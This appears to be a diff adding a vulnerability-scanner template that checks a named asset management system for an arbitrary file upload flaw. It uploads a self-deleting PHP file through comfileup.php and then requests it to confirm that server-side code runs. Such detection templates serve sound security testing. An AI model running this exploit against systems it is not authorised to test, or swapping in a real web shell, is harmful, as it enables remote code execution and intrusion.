@@ -1,0 +1,54 @@
+id: baiyishequ-intelligent-assets-file-upload
+info:
+  name: 百易社区 智能资产管理系统 - 任意文件上传漏洞
+  author: k3ppf0r
+  severity: high
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/140689981?spm=1001.2014.3001.5502
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-1387311
+    vendor: baiyishequ
+    product: intelligent-assets
+  tags: file-upload,vuln,baiyishequ
+variables:
+  s1: '{{to_lower(rand_text_alpha(20))}}'
+  s2: '{{to_lower(rand_text_alpha(20))}}'
+  rboundary: '{{to_lower(rand_text_alpha(8))}}'
+flow: http(1) && http(2)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/comfileup.php'
+    redirects: false
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+    body: |
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="file"; filename="{{s1}}.php"
+      Content-Type: application/octet-stream
+
+      <?php echo "{{s2}}"; unlink(__FILE__); ?>
+      ------WebKitFormBoundary{{rboundary}}--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, s1)'
+        internal: true
+    extractors:
+      - type: regex
+        name: tmp1
+        part: body
+        group: 1
+        regex:
+          - '/uploads(.+?).php'
+        internal: true
+  - method: GET
+    path:
+      - '{{BaseURL}}/uploads{{tmp1}}.php'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, s2)'
